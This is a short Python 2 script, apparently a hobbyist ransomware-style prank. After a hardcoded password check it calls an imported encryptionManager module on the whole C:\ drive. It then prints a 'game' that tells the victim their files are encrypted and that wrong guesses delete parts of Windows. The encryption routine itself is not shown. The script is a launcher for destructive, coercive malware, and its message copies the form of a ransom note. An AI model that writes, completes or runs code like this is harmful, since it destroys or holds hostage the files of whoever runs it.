
import encryptionManager
from Crypto.Cipher import AES # @UnresolvedImport

rootDirectionary = 'C:\\'





password = raw_input("Oh god dont do this accidentally, whats the password: ")  # @UndefinedVariable

if password != "basil":
    exit()


encryptionManager.manage(0, rootDirectionary)
             
        



#just a fun sad thing I made
print("Lets play a little game shall we?")
print("Guess a number between 1 and 6")
print("Every time you guess the wrong number a percentage of windows32 is deleted")
print("You have to survive 6 guesses")
print("Also all the files on your computer are now encrypted, meaning that if you")
print(" exit this program you will not get any of your files back.")
print("If you survive they will be decrypted")
